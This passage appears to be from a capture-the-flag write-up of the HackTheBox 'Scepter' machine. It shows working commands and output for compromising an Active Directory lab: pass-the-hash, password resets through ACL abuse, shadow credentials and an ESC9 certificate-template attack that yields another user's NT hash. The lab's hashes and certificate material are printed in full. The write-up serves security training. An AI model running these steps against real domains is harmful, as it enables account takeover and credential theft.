+</span><span style="color:#bf616a;">┌──</span><span>(venv)</span><span style="color:#bf616a;">─</span><span>(root㉿kali2025)</span><span style="color:#bf616a;">-[~/Desktop/HackTheBox/machines/scepter]
+</span><span style="color:#bf616a;">└─#</span><span> certipy auth</span><span style="color:#bf616a;"> -pfx</span><span> clark_extracted.pfx</span><span style="color:#bf616a;"> -dc-ip</span><span> 10.10.11.65
+</span><span style="color:#bf616a;">Certipy</span><span> v5.0.3 - by Oliver Lyak (ly4k)
+</span><span>
+</span><span style="color:#bf616a;">[-]</span><span> Failed to load PFX file: Could not deserialize PKCS12 data
+</span><span style="color:#bf616a;">[-]</span><span> Authentication failed: Could not deserialize PKCS12 data
+</span><span style="color:#bf616a;">[-]</span><span> Use</span><span style="color:#bf616a;"> -debug</span><span> to print a stacktrace
+</span><span>
+</span></code></pre>
+<p>The other <code>pfx</code> files also doesn't valid for authenticate.
+Gathering usernames from <code>pfx</code> files.</p>
+<pre data-lang="bash" style="background-color:#2b303b;color:#c0c5ce;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#bf616a;">openssl</span><span> pkcs12</span><span style="color:#bf616a;"> -in</span><span> clark.pfx</span><span style="color:#bf616a;"> -info -text -nodes -passin</span><span> pass:newpassword                   
+</span><span style="color:#bf616a;">MAC:</span><span> sha256, Iteration 2048                                                                   
+</span><span style="color:#bf616a;">MAC</span><span> length: 32, salt length: 8                                                                
+</span><span style="color:#bf616a;">PKCS7</span><span> Encrypted data: PBES2, PBKDF2, AES-256-CBC, Iteration 2048, PRF hmacWithSHA256
+</span><span style="color:#bf616a;">Certificate</span><span> bag                                                                               
+</span><span style="color:#bf616a;">Bag</span><span> Attributes                                                                                
+</span><span>    </span><span style="color:#bf616a;">localKeyID:</span><span> E1 84 EA CC 0B 68 19 40 D4 CA 6B 14 C1 8E 9E 30 E7 AA 48 B4 
+</span><span style="color:#bf616a;">subject</span><span>=</span><span style="color:#a3be8c;">DC=htb, </span><span style="color:#bf616a;">DC</span><span>=</span><span style="color:#a3be8c;">scepter, </span><span style="color:#bf616a;">CN</span><span>=</span><span style="color:#a3be8c;">Users, </span><span style="color:#bf616a;">CN</span><span>=</span><span style="color:#a3be8c;">m.clark                
+</span><span style="color:#bf616a;">issuer</span><span>=</span><span style="color:#a3be8c;">DC=htb, </span><span style="color:#bf616a;">DC</span><span>=</span><span style="color:#a3be8c;">scepter, </span><span style="color:#bf616a;">CN</span><span>=</span><span style="color:#a3be8c;">scepter-DC01-CA              
+</span></code></pre>
+<p>The usernames:</p>
+<pre data-lang="text" style="background-color:#2b303b;color:#c0c5ce;" class="language-text "><code class="language-text" data-lang="text"><span>m.clark
+</span><span>e.lewis
+</span><span>o.scott
+</span><span>d.baker
+</span></code></pre>
+<h2 id="pass-the-cert">Pass The Cert</h2>
+<p>Since <code>pfx</code> files are no use to us except username expose. The others files <code>baker.crt</code> (public key) and <code>baker.key</code> (private key) .</p>
+<p>Examining the <code>baker.crt</code> . The result the username for this certificate is <code>d.baker</code> .</p>
+<pre data-lang="bash" style="background-color:#2b303b;color:#c0c5ce;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#bf616a;">┌──</span><span>(venv)</span><span style="color:#bf616a;">─</span><span>(root㉿kali2025)</span><span style="color:#bf616a;">-[~/…/HackTheBox/machines/scepter/nfsshare]
+</span><span style="color:#bf616a;">└─#</span><span> head</span><span style="color:#bf616a;"> -n20</span><span> baker.crt                                                                        
+</span><span style="color:#bf616a;">Bag</span><span> Attributes
+</span><span>    </span><span style="color:#bf616a;">friendlyName: 
+</span><span>    </span><span style="color:#bf616a;">localKeyID:</span><span> DC 2B 20 65 C3 0D 91 40 E8 37 B5 CC 06 0F EA 66 5D 3B 7C 4E 
+</span><span style="color:#bf616a;">subject</span><span>=</span><span style="color:#a3be8c;">DC=htb, </span><span style="color:#bf616a;">DC</span><span>=</span><span style="color:#a3be8c;">scepter, </span><span style="color:#bf616a;">CN</span><span>=</span><span style="color:#a3be8c;">Users, </span><span style="color:#bf616a;">CN</span><span>=</span><span style="color:#a3be8c;">d.baker, </span><span style="color:#bf616a;">emailAddress</span><span>=</span><span style="color:#a3be8c;">d.baker@scepter.htb
+</span><span style="color:#bf616a;">issuer</span><span>=</span><span style="color:#a3be8c;">DC=htb, </span><span style="color:#bf616a;">DC</span><span>=</span><span style="color:#a3be8c;">scepter, </span><span style="color:#bf616a;">CN</span><span>=</span><span style="color:#a3be8c;">scepter-DC01-CA
+</span><span style="color:#bf616a;">-----BEGIN</span><span> CERTIFICATE-----
+</span><span style="color:#bf616a;">MIIGTDCCBTSgAwIBAgITYgAAADLhpcORUTEJewAAAAAAMjANBgkqhkiG9w0BAQsF
+</span><span style="color:#bf616a;">ADBIMRMwEQYKCZImiZPyLGQBGRYDaHRiMRcwFQYKCZImiZPyLGQBGRYHc2NlcHRl
+</span><span style="color:#bf616a;">cjEYMBYGA1UEAxMPc2NlcHRlci1EQzAxLUNBMB4XDTI0MTEwMjAxMTM0NloXDTI1
+</span><span style="color:#bf616a;">MTEwMjAxMTM0NlowdDETMBEGCgmSJomT8ixkARkWA2h0YjEXMBUGCgmSJomT8ixk
+</span><span style="color:#bf616a;">ARkWB3NjZXB0ZXIxDjAMBgNVBAMTBVVzZXJzMRAwDgYDVQQDEwdkLmJha2VyMSIw
+</span><span style="color:#bf616a;">IAYJKoZIhvcNAQkBFhNkLmJha2VyQHNjZXB0ZXIuaHRiMIIBIjANBgkqhkiG9w0B
+</span><span style="color:#bf616a;">AQEFAAOCAQ8AMIIBCgKCAQEApYOPHHtw8CsIIS6mFkoI8CtD5I4Tu36JDSObdnYZ
+</span><span style="color:#bf616a;">kZ1eKW/Vif1rXL9LHykKhJbTGuJsEDSHKt7mYs0r49JU3HrW2ZIosuIhSq25gcql
+</span><span style="color:#bf616a;">73tnI7RoCc8n6zUZBQaiEJbbXAhcKJ1Tkarc3ZX3U9aHoKkklMJhyH01D/3xvGsM
+</span><span style="color:#bf616a;">6XbCFHby3HmnwouKph9/a7e2XPynHnYvwbU3POkJPm+P45Ko5r18VuELdHJBGOVx
+</span><span style="color:#bf616a;">9/aOxqQ9wU1Rqi4O711dWAenr8wfG0IUIEm2hmPKAfAJw+dKgpspe9TtUZlJs0M4
+</span><span style="color:#bf616a;">ZLa/xdhdySmr9snryirgSYD9KEzWx+0NsqaHfmM1aqsZEwIDAQABo4IDATCCAv0w
+</span><span style="color:#bf616a;">HQYDVR0OBBYEFDeUzFfjpMtVYxpHj4PQblDCNGNRMB8GA1UdIwQYMBaAFOuQVDjS
+</span><span style="color:#bf616a;">pmyJasttTaS6dRVgFSfjMIHKBgNVHR8EgcIwgb8wgbyggbmggbaGgbNsZGFwOi8v
+</span></code></pre>
+<p>Also the private key file is password encrypted.</p>
+<p><img src="/images/HackTheBox/HTB-Scepter/Pasted_image_20250718063710.png" alt="" /></p>
+<p>The same password is valid for the <code>baker.key</code> private key file.</p>
+<pre data-lang="bash" style="background-color:#2b303b;color:#c0c5ce;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#bf616a;">openssl</span><span> rsa</span><span style="color:#bf616a;"> -in</span><span> baker.key</span><span style="color:#bf616a;"> -out</span><span> dbaker.key</span><span style="color:#bf616a;"> -passin</span><span> pass:newpassword
+</span></code></pre>
+<p><img src="/images/HackTheBox/HTB-Scepter/Pasted_image_20250718063906.png" alt="" /></p>
+<p>Generating <code>pfx</code> file and than authenticate to box.</p>
+<p><img src="/images/HackTheBox/HTB-Scepter/Pasted_image_20250718064006.png" alt="" /></p>
+<h2 id="preparation">Preparation</h2>
+<p>This step is not always necessary, making preparations are always good.</p>
+<p><code>/etc/hosts</code> file</p>
+<p><code>10.10.11.65     dc01.scepter.htb scepter.htb dc01</code></p>
+<p><code>krb5.conf</code> file</p>
+<pre data-lang="bash" style="background-color:#2b303b;color:#c0c5ce;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#bf616a;">┌──</span><span>(root㉿kali2025)</span><span style="color:#bf616a;">-[~/Desktop/HackTheBox/machines/scepter]
+</span><span style="color:#bf616a;">└─#</span><span> nxc smb dc01.scepter.htb</span><span style="color:#bf616a;"> -u</span><span> d.baker</span><span style="color:#bf616a;"> -H </span><span>&#39;</span><span style="color:#a3be8c;">18b5fb0d99e7a475316213c15b6f22ce</span><span>&#39;</span><span style="color:#bf616a;"> --generate-krb5-file</span><span> krb5.conf
+</span><span style="color:#bf616a;">SMB</span><span>         10.10.11.65     445    DC01             </span><span style="color:#b48ead;">[</span><span>*</span><span style="color:#b48ead;">]</span><span> Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (</span><span style="color:#bf616a;">domain:scepter.htb</span><span>) (signing:True) (</span><span style="color:#bf616a;">SMBv1:False</span><span>) 
+</span><span style="color:#bf616a;">SMB</span><span>         10.10.11.65     445    DC01             </span><span style="color:#b48ead;">[</span><span>+</span><span style="color:#b48ead;">]</span><span> scepter.htb</span><span style="color:#96b5b4;">\d</span><span>.baker:18b5fb0d99e7a475316213c15b6f22ce 
+</span><span>
+</span><span style="color:#bf616a;">┌──</span><span>(root㉿kali2025)</span><span style="color:#bf616a;">-[~/Desktop/HackTheBox/machines/scepter]
+</span><span style="color:#bf616a;">└─#</span><span> cat krb5.conf 
+</span><span>
+</span><span style="color:#bf616a;">[libdefaults]
+</span><span>    </span><span style="color:#bf616a;">dns_lookup_kdc</span><span> = true
+</span><span>    </span><span style="color:#bf616a;">dns_lookup_realm</span><span> = true
+</span><span>    </span><span style="color:#bf616a;">default_realm</span><span> = SCEPTER.HTB
+</span><span>
+</span><span style="color:#bf616a;">[realms]
+</span><span>    </span><span style="color:#bf616a;">SCEPTER.HTB</span><span> = {
+</span><span>        kdc = dc01.scepter.htb
+</span><span>        admin_server = dc01.scepter.htb
+</span><span>        default_domain = scepter.htb
+</span><span>    }
+</span><span>
+</span><span style="color:#bf616a;">[domain_realm]
+</span><span>    </span><span style="color:#bf616a;">.scepter.htb</span><span> = SCEPTER.HTB
+</span><span>    </span><span style="color:#bf616a;">scepter.htb</span><span> = SCEPTER.HTB
+</span></code></pre>
+<p>Updating clock</p>
+<p><code>ntpdate 10.10.11.65</code></p>
+<p>``</p>
+<h2 id="bloodhound-analysis">Bloodhound Analysis</h2>
+<p>Gathering bloodhound data with <code>bloodhound-ce-python</code></p>
+<p><code>bloodhound-ce-python -d scepter.htb -ns 10.10.11.65 -u 'd.baker' --hashes :18b5fb0d99e7a475316213c15b6f22ce --zip -c All</code></p>
+<p><img src="/images/HackTheBox/HTB-Scepter/Pasted_image_20250718064838.png" alt="" /></p>
+<p>Gathering users on AD environment.</p>
+<p><img src="/images/HackTheBox/HTB-Scepter/Pasted_image_20250718070004.png" alt="" /></p>
+<p><code>D.BAKER</code> users member of <code>STAFF@SCEPTER.HTB</code> group</p>
+<h3 id="d-baker-staff-group">D.Baker Staff Group</h3>
+<p><img src="/images/HackTheBox/HTB-Scepter/Pasted_image_20250718070206.png" alt="" /></p>
+<p>When i check the <code>Outbound Object Control</code> , <code>d.baker</code> users has <code>ForceChangePassword</code> rights on <code>a.carter</code> .</p>
+<p><img src="/images/HackTheBox/HTB-Scepter/Pasted_image_20250718070400.png" alt="" /></p>
+<p>I'd like to be informed about other ACL's about other users. This query gave a lot information about the nodes. The query basically does any node has 1 or more edge bring it here.</p>
+<pre data-lang="cypher" style="background-color:#2b303b;color:#c0c5ce;" class="language-cypher "><code class="language-cypher" data-lang="cypher"><span>MATCH p=(n)-[*1..]-&gt;(c) 
+</span><span>RETURN p 
+</span><span>LIMIT 1000
+</span></code></pre>
+<p>I shared relevant part in below. <code>a.carter</code> user member of <code>IT SUPPORT</code> group. This group has <code>genericAll</code> rights on <code>STAFF ACCESS CERTIFICATE</code> OU</p>
+<h3 id="staff-access-certificate-ou">Staff Access Certificate OU</h3>
+<p><img src="/images/HackTheBox/HTB-Scepter/Pasted_image_20250718071331.png" alt="" /></p>
+<p>The attack path can also find following <code>Outbound Object Control</code> property. The interesting thing about this <a href="https://ismailbozkurt.github.io/blog/HackTheBox/htb-scepter-writeup/#staff-access-certificate-ou">OU</a> , its affected only <code>d.baker</code></p>
+<h3 id="attack-path-it-support">Attack Path - IT Support</h3>
+<p><img src="/images/HackTheBox/HTB-Scepter/Pasted_image_20250718071748.png" alt="" /></p>
+<p>The other important information is about <code>p.adams</code> user. <code>p.adams</code> member of <code>REPLICATION OPERATORS</code> group, and this group can <code>DCSync</code> attack the DC. This means, if we are able to get <code>p.adams</code> we are achieving to dump <code>ntds.dit</code> file ^replication-operators-group</p>
+<p><img src="/images/HackTheBox/HTB-Scepter/Pasted_image_20250718072430.png" alt="" /></p>
+<p>Another piece of information about the <code>h.brown</code> user. This user member of <code>PROTECTED USERS</code> , <code>HELPDESK ADMINS</code> , <code>REMOTE MANAGEMENT USERS</code> and <code>CMS</code> groups.</p>
+<p>Btw the only user member of these groups is <code>h.brown</code></p>
+<p><img src="/images/HackTheBox/HTB-Scepter/Pasted_image_20250718072922.png" alt="" /></p>
+<p>The last piece but most important information about <code>HELPDESK ENROLLMENT CERTIFICATE</code> OU
+This OU affects <code>p.adams</code> user.</p>
+<h3 id="helpdesk-enrollment-certificate-ou">Helpdesk Enrollment Certificate OU</h3>
+<p><img src="/images/HackTheBox/HTB-Scepter/Pasted_image_20250718073712.png" alt="" /></p>
+<h2 id="certificate-analysis">Certificate Analysis</h2>
+<p>Gathering informations about AD Certificate Templates with <code>certipy</code> .</p>
+<pre data-lang="bash" style="background-color:#2b303b;color:#c0c5ce;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#bf616a;">certipy</span><span> find</span><span style="color:#bf616a;"> -dc-ip</span><span> 10.10.11.65</span><span style="color:#bf616a;"> -u</span><span> d.baker</span><span style="color:#bf616a;"> -hashes</span><span> 18b5fb0d99e7a475316213c15b6f22ce</span><span style="color:#bf616a;"> -stdout -text
+</span></code></pre>
+<p>Total 34 certificate template exist in AD environment.</p>
+<h3 id="staffaccesscertificate">StaffAccessCertificate</h3>
+<p>The first one is <code>StaffAccessCertificate</code> , This certificate is vulnerable to <a href="https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc9-no-security-extension-on-certificate-template">ESC9</a> attack. Any member of this group (d.baker) has enrollment rights to this group. Also the IT SUPPORT group has <code>genericAll</code> rights on this certificate.</p>
+<p><img src="/images/HackTheBox/HTB-Scepter/Pasted_image_20250718074405.png" alt="" /></p>
+<h3 id="helpdeskenrollmentcertificate">HelpdeskEnrollmentCertificate</h3>
+<p>This certificate is the key to conquer AD. <code>Domain Computers</code> has <code>User Enrollable Principals</code> and <code>Enrollment rights</code> .</p>
+<p><img src="/images/HackTheBox/HTB-Scepter/Pasted_image_20250718075802.png" alt="" /></p>
+<h2 id="forcechangepassword-acl-abuse">ForceChangePassword ACL Abuse</h2>
+<p>Setting password for <code>a.carter</code></p>
+<pre data-lang="bash" style="background-color:#2b303b;color:#c0c5ce;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#bf616a;">┌──</span><span>(venv)</span><span style="color:#bf616a;">─</span><span>(root㉿kali2025)</span><span style="color:#bf616a;">-[~/Desktop/HackTheBox/machines/scepter]
+</span><span style="color:#bf616a;">└─#</span><span> bloodyAD</span><span style="color:#bf616a;"> -d</span><span> scepter.htb</span><span style="color:#bf616a;"> --dc-ip</span><span> 10.10.11.65</span><span style="color:#bf616a;"> -u</span><span> d.baker</span><span style="color:#bf616a;"> -p </span><span>&#39;</span><span style="color:#a3be8c;">:18b5fb0d99e7a475316213c15b6f22ce</span><span>&#39; set password a.carter &#39;</span><span style="color:#a3be8c;">Password123.!</span><span>&#39;
+</span><span>
+</span></code></pre>
+<h2 id="genericall-acl-abuse">genericAll ACL Abuse</h2>
+<p><code>a.carter</code> user has <code>genericAll</code> rights on <code>StaffAccessCertificate</code> template. To verify that i gave <code>d.baker</code> genericAll rights on <code>STAFF ACCESS CERTIFCATE</code> OU.</p>
+<pre data-lang="bash" style="background-color:#2b303b;color:#c0c5ce;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#bf616a;">┌──</span><span>(venv)</span><span style="color:#bf616a;">─</span><span>(root㉿kali2025)</span><span style="color:#bf616a;">-[~/Desktop/HackTheBox/machines/scepter]
+</span><span style="color:#bf616a;">└─#</span><span> bloodyAD</span><span style="color:#bf616a;"> -d</span><span> scepter.htb</span><span style="color:#bf616a;"> --dc-ip</span><span> 10.10.11.65</span><span style="color:#bf616a;"> -u</span><span> a.carter</span><span style="color:#bf616a;"> -p </span><span>&#39;</span><span style="color:#a3be8c;">Password123.!</span><span>&#39; add genericAll &#39;</span><span style="color:#a3be8c;">OU=STAFF ACCESS CERTIFICATE,DC=SCEPTER,DC=HTB</span><span>&#39; d.baker
+</span><span style="color:#bf616a;">[+]</span><span> d.baker has now GenericAll on OU=STAFF ACCESS CERTIFICATE,DC=SCEPTER,DC=HTB
+</span></code></pre>
+<h2 id="esc9-explotitation">ESC9 Explotitation</h2>
+<p>The the enrollment requirements should be met defined in <code>Certificate Name Flag</code> .</p>
+<pre data-lang="text" style="background-color:#2b303b;color:#c0c5ce;" class="language-text "><code class="language-text" data-lang="text"><span>SubjectAltRequireEmail
+</span><span>SubjectRequireDnsAsCn
+</span><span>SubjectRequireEmail
+</span></code></pre>
+<p><img src="/images/HackTheBox/HTB-Scepter/Pasted_image_20250718153335.png" alt="" /></p>
+<p>The <code>email</code> attributes empty for all the users.</p>
+<p><img src="/images/HackTheBox/HTB-Scepter/Pasted_image_20250718155448.png" alt="" /></p>
+<p>When we try to set <code>mail</code> attribute of <code>d.baker</code> , got error <code>insufficient rights</code> .</p>
+<p><img src="/images/HackTheBox/HTB-Scepter/Pasted_image_20250718160021.png" alt="" /></p>
+<p>This issue happens, the explanation of this issue is <a href="https://bloodhound.specterops.io/resources/edges/adcs-esc3#windows">here</a>.</p>
+<blockquote>
+<blockquote>
+<p>The ‘mail’ attribute can be set on both user and computer objects but the ‘dNSHostName’ attribute can only be set on computer objects. Computers have validated write permission to their own ‘dNSHostName’ attribute by default, but neither users nor computers can write to their own ‘mail’ attribute by default.</p>
+</blockquote>
+</blockquote>
+<p>But <code>altSecurityIdentities</code> is defined for <code>h.brown</code> and the mapping flagged as <strong><code>weak</code></strong>
+Reference: <a href="https://www.thehacker.recipes/ad/movement/adcs/certificate-templates#explicit-certificate-mapping">Explicit Certificate Mapping</a></p>
+<p><img src="/images/HackTheBox/HTB-Scepter/Pasted_image_20250718153605.png" alt="" /></p>
+<p>The <a href="https://ismailbozkurt.github.io/blog/HackTheBox/htb-scepter-writeup/#staff-access-certificate-ou">genericAll Rights on StaffAccessCertificate</a> from blodhound analysis phase, we can set <code>d.baker</code> mail or any other attribute with <code>a.carter</code> .</p>
+<p>There are 2 article has explain the steps of ESC9 Attack.
+<a href="https://bloodhound.specterops.io/resources/edges/adcs-esc9a">ADCSESC9a</a>
+<a href="https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc9-no-security-extension-on-certificate-template">ESC9: No Security Extension on Certificate Template</a></p>
+<p>So steps are below.</p>
+<h5 id="1-update-victims-account-upn">1. update victims account upn</h5>
+<pre data-lang="bash" style="background-color:#2b303b;color:#c0c5ce;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#bf616a;">┌──</span><span>(venv)</span><span style="color:#bf616a;">─</span><span>(root㉿kali2025)</span><span style="color:#bf616a;">-[~/Desktop/HackTheBox/machines/scepter]
+</span><span style="color:#bf616a;">└─#</span><span> certipy account</span><span style="color:#bf616a;"> -dc-ip</span><span> 10.10.11.65</span><span style="color:#bf616a;"> -u </span><span>&#39;</span><span style="color:#a3be8c;">a.carter@scepter.htb</span><span>&#39;</span><span style="color:#bf616a;"> -p </span><span>&#39;</span><span style="color:#a3be8c;">Password123.!</span><span>&#39;</span><span style="color:#bf616a;"> -user </span><span>&#39;</span><span style="color:#a3be8c;">d.baker</span><span>&#39;</span><span style="color:#bf616a;"> -upn </span><span>&#39;</span><span style="color:#a3be8c;">h.brown</span><span>&#39; update
+</span><span style="color:#bf616a;">Certipy</span><span> v5.0.2 - by Oliver Lyak (ly4k)
+</span><span>
+</span><span style="color:#bf616a;">[*]</span><span> Updating user &#39;</span><span style="color:#a3be8c;">d.baker</span><span>&#39;:
+</span><span>    </span><span style="color:#bf616a;">userPrincipalName</span><span>                   : h.brown 
+</span><span style="color:#bf616a;">[*]</span><span> Successfully updated &#39;</span><span style="color:#a3be8c;">d.baker
+</span></code></pre>
+<h5 id="1-2-update-victim-account-s-email-attribute">1.2 update victim account's email attribute</h5>
+<pre data-lang="bash" style="background-color:#2b303b;color:#c0c5ce;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#bf616a;">┌──</span><span>(venv)</span><span style="color:#bf616a;">─</span><span>(root㉿kali2025)</span><span style="color:#bf616a;">-[~/Desktop/HackTheBox/machines/scepter]
+</span><span style="color:#bf616a;">└─#</span><span> bloodyAD</span><span style="color:#bf616a;"> -d</span><span> scepter.htb</span><span style="color:#bf616a;"> --dc-ip</span><span> 10.10.11.65</span><span style="color:#bf616a;"> -u</span><span> a.carter</span><span style="color:#bf616a;"> -p </span><span>&#39;</span><span style="color:#a3be8c;">Password123.!</span><span>&#39; set object d.baker &#39;</span><span style="color:#a3be8c;">mail</span><span>&#39;</span><span style="color:#bf616a;"> -v </span><span>&#39;</span><span style="color:#a3be8c;">h.brown@scepter.htb</span><span>&#39;                                                                    
+</span><span style="color:#bf616a;">[+]</span><span> d.baker&#39;</span><span style="color:#a3be8c;">s mail has been updated
+</span></code></pre>
+<h5 id="2-obtain-newly-created-ccache-ticket">2. Obtain newly created ccache ticket</h5>
+<pre data-lang="bash" style="background-color:#2b303b;color:#c0c5ce;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#bf616a;">┌──</span><span>(venv)</span><span style="color:#bf616a;">─</span><span>(root㉿kali2025)</span><span style="color:#bf616a;">-[~/Desktop/HackTheBox/machines/scepter]
+</span><span style="color:#bf616a;">└─#</span><span> bloodyAD</span><span style="color:#bf616a;"> -d</span><span> scepter.htb</span><span style="color:#bf616a;"> --dc-ip</span><span> 10.10.11.65</span><span style="color:#bf616a;"> -u</span><span> a.carter</span><span style="color:#bf616a;"> -p </span><span>&#39;</span><span style="color:#a3be8c;">Password123.!</span><span>&#39; add shadowCredentials d.baker
+</span><span style="color:#bf616a;">[+]</span><span> KeyCredential generated with following sha256 of RSA key: 381b4f3ffb79ed80da8e2c76361e74923fc9b6c75640c215e0059fcc4e130f9e
+</span><span style="color:#bf616a;">[+]</span><span> TGT stored in ccache file d.baker_e1.ccache
+</span><span>
+</span><span style="color:#bf616a;">NT:</span><span> 18b5fb0d99e7a475316213c15b6f22ce
+</span><span>
+</span></code></pre>
+<h5 id="3-request-certificate-via-vulnerable-template">3. Request Certificate via vulnerable template</h5>
+<pre data-lang="bash" style="background-color:#2b303b;color:#c0c5ce;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#bf616a;">┌──</span><span>(venv)</span><span style="color:#bf616a;">─</span><span>(root㉿kali2025)</span><span style="color:#bf616a;">-[~/Desktop/HackTheBox/machines/scepter]
+</span><span style="color:#bf616a;">└─#</span><span> KRB5CCNAME=d.baker_e1.ccache certipy req</span><span style="color:#bf616a;"> -k -dc-ip</span><span> 10.10.11.65</span><span style="color:#bf616a;"> -target</span><span> dc01.scepter.htb</span><span style="color:#bf616a;"> -ca </span><span>&#39;</span><span style="color:#a3be8c;">scepter-DC01-CA</span><span>&#39;</span><span style="color:#bf616a;"> -template </span><span>&#39;</span><span style="color:#a3be8c;">StaffAccessCertificate</span><span>&#39;                                                 
+</span><span style="color:#bf616a;">Certipy</span><span> v5.0.2 - by Oliver Lyak (ly4k)
+</span><span>
+</span><span style="color:#bf616a;">[!]</span><span> DC host (-dc-host) </span><span style="color:#bf616a;">not</span><span> specified and Kerberos authentication is used. This might fail
+</span><span style="color:#bf616a;">[*]</span><span> Requesting certificate via RPC
+</span><span style="color:#bf616a;">[*]</span><span> Request ID is 3                              
+</span><span style="color:#bf616a;">[*]</span><span> Successfully requested certificate
+</span><span style="color:#bf616a;">[*]</span><span> Got certificate without identity
+</span><span style="color:#bf616a;">[*]</span><span> Certificate has no object SID
+</span><span style="color:#bf616a;">[*]</span><span> Try using</span><span style="color:#bf616a;"> -sid</span><span> to set the object SID or see the wiki for more details
+</span><span style="color:#bf616a;">[*]</span><span> Saving certificate and private key to &#39;</span><span style="color:#a3be8c;">d.baker.pfx</span><span>&#39;
+</span><span style="color:#bf616a;">[*]</span><span> Wrote certificate and private key to &#39;</span><span style="color:#a3be8c;">d.baker.pfx</span><span>&#39;
+</span><span>
+</span></code></pre>
+<h5 id="4-restore-victim-account-s-upn">4. Restore victim account's upn</h5>
+<pre data-lang="bash" style="background-color:#2b303b;color:#c0c5ce;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#bf616a;">┌──</span><span>(venv)</span><span style="color:#bf616a;">─</span><span>(root㉿kali2025)</span><span style="color:#bf616a;">-[~/Desktop/HackTheBox/machines/scepter]
+</span><span style="color:#bf616a;">└─#</span><span> certipy account</span><span style="color:#bf616a;"> -dc-ip</span><span> 10.10.11.65</span><span style="color:#bf616a;"> -u </span><span>&#39;</span><span style="color:#a3be8c;">a.carter@scepter.htb</span><span>&#39;</span><span style="color:#bf616a;"> -p </span><span>&#39;</span><span style="color:#a3be8c;">Password123.!</span><span>&#39;</span><span style="color:#bf616a;"> -user </span><span>&#39;</span><span style="color:#a3be8c;">d.baker</span><span>&#39;</span><span style="color:#bf616a;"> -upn </span><span>&#39;</span><span style="color:#a3be8c;">d.baker</span><span>&#39; update                           
+</span><span style="color:#bf616a;">Certipy</span><span> v5.0.2 - by Oliver Lyak (ly4k)
+</span><span>
+</span><span style="color:#bf616a;">[*]</span><span> Updating user &#39;</span><span style="color:#a3be8c;">d.baker</span><span>&#39;:
+</span><span>    </span><span style="color:#bf616a;">userPrincipalName</span><span>                   : d.baker 
+</span><span style="color:#bf616a;">[*]</span><span> Successfully updated &#39;</span><span style="color:#a3be8c;">d.baker</span><span>&#39;
+</span><span>
+</span></code></pre>
+<h5 id="5-get-nt-hash-via-pfx-file">5. Get NT hash via pfx file</h5>
+<pre data-lang="bash" style="background-color:#2b303b;color:#c0c5ce;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#bf616a;">┌──</span><span>(venv)</span><span style="color:#bf616a;">─</span><span>(root㉿kali2025)</span><span style="color:#bf616a;">-[~/Desktop/HackTheBox/machines/scepter]
+</span><span style="color:#bf616a;">└─#</span><span> certipy auth</span><span style="color:#bf616a;"> -dc-ip</span><span> 10.10.11.65</span><span style="color:#bf616a;"> -pfx</span><span> d.baker.pfx</span><span style="color:#bf616a;"> -username </span><span>&#39;</span><span style="color:#a3be8c;">h.brown</span><span>&#39;</span><span style="color:#bf616a;"> -domain</span><span> scepter.htb
+</span><span style="color:#bf616a;">Certipy</span><span> v5.0.2 - by Oliver Lyak (ly4k)
+</span><span>
+</span><span style="color:#bf616a;">[*]</span><span> Certificate identities:
+</span><span style="color:#bf616a;">[*]</span><span>     No identities found in this certificate
+</span><span style="color:#bf616a;">[!]</span><span> Could not find identity in the provided certificate
+</span><span style="color:#bf616a;">[*]</span><span> Using principal: &#39;</span><span style="color:#a3be8c;">h.brown@scepter.htb</span><span>&#39;
+</span><span style="color:#bf616a;">[*]</span><span> Trying to get TGT...
+</span><span style="color:#bf616a;">[*]</span><span> Got TGT                                      
+</span><span style="color:#bf616a;">[*]</span><span> Saving credential cache to &#39;</span><span style="color:#a3be8c;">h.brown.ccache</span><span>&#39;
+</span><span style="color:#bf616a;">[*]</span><span> Wrote credential cache to &#39;</span><span style="color:#a3be8c;">h.brown.ccache</span><span>&#39;
+</span><span style="color:#bf616a;">[*]</span><span> Trying to retrieve NT hash for &#39;</span><span style="color:#a3be8c;">h.brown</span><span>&#39;
+</span><span style="color:#bf616a;">[*]</span><span> Got hash for &#39;</span><span style="color:#a3be8c;">h.brown@scepter.htb</span><span>&#39;: aad3b435b51404eeaad3b435b51404ee:4ecf5242092c6fb8c360a08069c75a0c
+</span></code></pre>
+<h2 id="esc14a-write-access-on-altsecurityidentities">ESC14A Write Access on altSecurityIdentities</h2>
+<p>Authenticating as <code>h.brown</code> with <code>NTLM</code> is not possible due to <code>Protected Users</code> . Since the only user <code>h.brown</code> member of <code>Remote Management Users</code> .</p>
+<h3 id="what-is-protected-users-group">What is Protected Users Group</h3>
+<blockquote>
+<blockquote>
+<p>The <strong>Protected Users group</strong> in Active Directory (introduced in Windows Server 2012 R2) is a special security group designed to enhance the security of privileged accounts by enforcing stricter authentication policies. When a user is added to this group, certain legacy and insecure authentication mechanisms are disabled for that account. For example, the use of <strong>NTLM</strong>, <strong>Digest Authentication</strong>, and <strong>CredSSP</strong> is blocked, and delegation scenarios such as <strong>unconstrained delegation</strong> and <strong>protocol transition</strong> are also prevented. Furthermore, <strong>Ticket Granting Ticket (TGT)</strong> lifetime is limited to 4 hours by default, reducing the window for potential misuse in case of ticket theft.</p>
+</blockquote>
+</blockquote>
+<blockquote>
+<blockquote>
+<p>Regarding <strong>Kerberos authentication</strong>, when a user is in the Protected Users group, <strong>Kerberos</strong> becomes the only supported authentication protocol for domain services. However, this Kerberos usage is subject to strict enforcement: it does not cache credentials locally, requires AES encryption, and enforces stricter ticket policies. If a service or application only supports <strong>NTLM</strong>, authentication will fail for Protected Users, making compatibility planning critical. This enforcement helps mitigate risks like <strong>pass-the-hash</strong> and <strong>pass-the-ticket</strong> attacks, but may disrupt older systems or services that rely on legacy protocols.</p>
+</blockquote>
+</blockquote>
